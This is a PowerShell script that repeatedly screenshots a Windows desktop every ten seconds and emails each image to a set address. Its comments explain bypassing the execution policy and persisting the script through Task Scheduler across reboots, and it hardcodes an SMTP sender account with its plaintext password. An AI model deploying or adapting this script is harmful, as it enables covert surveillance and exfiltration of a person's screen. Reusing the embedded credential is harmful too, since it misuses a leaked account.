# test execution in cmd to run powershell -ExecutionPolicy Bypass C:\PATHtoTHEscript\ss.ps1  
# replace the pathe to the PS script in the XML Task Sheduler config by task in the section <Exec>
# Enable task, laung task or reboot machine
# powershell C:\Users\rusla\AppData\Local\SS\ss.ps1

#customer settings
$MailSubject = "Dell E6230 Desktop Screen Ruslan"; # up to you
$MailBody = "Some text in the Body"; # up to you
$receivermail = "a@vg.co"; # up to you


# screenshot period in seconds
$sleeping = 10;

# sender e-mail auth data
$MailSender = "screenshot@odecom.od.ua";
$MailSenderPassword = "gUK&r4Zg2w6F";
$MailServer = "mail.odecom.od.ua";
$MailServerPort = "587";

# fullpath to scrips and screenshot
$pathget = Get-Location;
$path = ("$pathget\" + "screenshot.png");
Write-Host $path;

# cycle is infinitive
while($true){
    
    # screenshoting
    [void][reflection.assembly]::loadwithpartialname("system.windows.forms");
    [system.windows.forms.sendkeys]::sendwait('{PRTSC}');
    Get-Clipboard -Format Image | ForEach-Object -MemberName Save -ArgumentList $path;
    Write-Host "The screenshot has gotten";

    # e-mail sending procedure with the attachment
    function Send-ToEmail([string]$email, [string]$attachmentpath){

        $message = new-object Net.Mail.MailMessage;
        $message.From = $MailSender;
        $message.To.Add($email);
        $message.Subject = $MailSubject;
        $message.Body = $MailBody;
        $attachment = New-Object Net.Mail.Attachment($attachmentpath);
        $message.Attachments.Add($attachment);
        $Username = $MailSender; # sender login
        $Password = $MailSenderPassword; # sender password
        $smtp = new-object Net.Mail.SmtpClient($MailServer, $MailServerPort);
        $smtp.EnableSSL = $true;
        $smtp.Credentials = New-Object System.Net.NetworkCredential($Username, $Password);
        $smtp.send($message);
        $attachment.Dispose();
    }
    
    # sending e-mail to receiver with a attachment
    Send-ToEmail  -email $receivermail -attachmentpath $path;
    Write-Host "Mail Sent"; # just for test notifications
    
    # screenshot deletion
    Remove-Item $path;
    Write-Host "Screen removed";
    # waiting time of execution period
    Start-Sleep($sleeping);
    Write-Host ("The "+ $sleeping +" seconds period has done");
}